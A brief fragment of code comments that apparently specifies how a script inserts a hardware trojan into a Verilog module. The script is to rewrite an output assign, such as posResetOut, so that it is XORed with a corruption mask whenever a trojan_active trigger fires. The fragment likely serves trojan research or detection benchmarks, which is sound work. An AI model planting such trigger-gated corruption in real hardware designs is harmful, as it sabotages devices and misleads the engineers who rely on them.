...
//
// IMPORTANT: posResetOut may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If posResetOut is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for posResetOut (or first output assign):
//     assign posResetOut = <expr>;
//   Replace with:
//     assign posResetOut = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
